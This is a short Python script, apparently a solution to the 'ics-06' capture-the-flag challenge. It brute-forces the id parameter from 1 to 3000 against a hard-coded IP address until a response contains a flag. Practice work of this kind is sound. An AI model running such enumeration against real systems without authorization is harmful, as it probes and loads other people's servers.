'''
Author: 谢嘉伟 wei17306927526@gmail.com
Date: 2024-12-04 10:52:21
LastEditors: 谢嘉伟 wei17306927526@gmail.com
LastEditTime: 2024-12-04 10:56:29
FilePath: /undefined/Users/xiejiawei/codeSecurity/kali/scripts/ics-06/ctf_script.py
Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
'''
import requests

# 目标URL的基础部分，去除参数部分
base_url = "http://61.147.171.105:54464/index.php"
# 要替换参数的范围
for param_value in range(1, 3001):
    # 构造完整的带参数的URL
    target_url = f"{base_url}?id={param_value}"
    try:
        response = requests.get(target_url)
        # 获取网页内容并转为文本格式，方便后续判断
        content = response.text
        print(f"返回内容为：{content}")
        if "flag" in content:
            print(f"找到flag了！对应的URL是：{target_url}")
            break
        else:
            print(f"在URL {target_url} 的返回内容中未找到flag，继续尝试...")
    except requests.RequestException as e:
        print(f"请求 {target_url} 出现错误：{e}")
